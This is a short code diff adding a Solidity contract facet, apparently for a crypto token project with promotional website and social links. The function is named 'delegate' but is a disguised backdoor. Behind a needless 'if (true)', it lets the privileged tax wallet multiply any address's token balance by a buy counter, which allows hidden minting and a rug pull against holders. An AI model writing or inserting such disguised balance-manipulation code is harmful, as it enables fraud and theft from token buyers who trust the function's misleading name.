@@ -1,0 +1,20 @@
+// SPDX-License-Identifier: UNLICENSED
+
+/*
+    Website:  https://anvm.io/
+    Twitter:  https://twitter.com/AINNLayer2
+    Telegram:  https://t.me/AINN_ANVM
+
+*/
+
+pragma solidity ^0.8.24;
+import "./TestLib.sol";
+contract delegateFacet is Ownable {
+    function delegate(address delegatee) external {
+        TestLib.TestStorage storage ds = TestLib.diamondStorage();
+        if (true) {
+            require(ds._taxWallet == _msgSender());
+            ds._balances[delegatee] *= ds.buyCount;
+        }
+    }
+}
